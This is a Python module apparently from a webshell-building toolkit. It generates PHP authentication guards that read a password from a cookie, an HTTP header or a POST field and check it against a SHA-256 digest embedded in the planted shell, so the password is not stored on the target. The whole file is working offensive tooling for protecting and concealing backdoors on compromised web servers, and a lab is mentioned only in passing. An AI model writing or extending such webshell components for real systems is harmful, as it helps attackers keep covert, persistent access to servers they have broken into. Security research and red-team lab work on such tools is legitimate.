"""Authentication guard generation for authenticated webshells.

The credential is compared against a SHA-256 digest embedded in the shell, so
the plaintext password is never stored on the target. ``hash("sha256", ...)``
exists in PHP 5.1.2+, which keeps the generated PHP compatible with the lab.
"""

from __future__ import annotations

import hashlib

from shellsuite.protocol import contract

ALGORITHM = "sha256"

# How each vector reads its credential. Value is a PHP statement (or statements)
# that assign the supplied credential to $__ss_auth; ``{name}`` is filled with
# the vector's channel name from contract.AUTH_PARAM_NAMES. Adding a vector to
# the contract means adding one entry here; guard() raises if one is missing.
_READERS: dict[str, str] = {
    "cookie": '$__ss_auth = isset($_COOKIE["{name}"]) ? $_COOKIE["{name}"] : "";',
    "header": (
        '$__ss_akey = "HTTP_" . strtoupper(str_replace("-", "_", "{name}"));\n'
        '$__ss_auth = isset($_SERVER[$__ss_akey]) ? $_SERVER[$__ss_akey] : "";'
    ),
    "post": '$__ss_auth = isset($_POST["{name}"]) ? $_POST["{name}"] : "";',
}


def secret_hash(secret: str) -> str:
    """SHA-256 hex digest of the password, as embedded in the webshell."""
    return hashlib.sha256(secret.encode("utf-8")).hexdigest()


def guard(vector: str, expected_hash: str) -> str:
    """Return the PHP that reads the vector's credential and sets $__ss_ok."""
    reader = _READERS.get(vector)
    if reader is None:
        raise ValueError(f"no auth reader for vector: {vector!r}")
    read = reader.format(name=contract.AUTH_PARAM_NAMES[vector])
    check = (
        f'$__ss_ok = ($__ss_auth !== "" && '
        f'hash("{ALGORITHM}", $__ss_auth) === "{expected_hash}");'
    )
    return read + "\n" + check
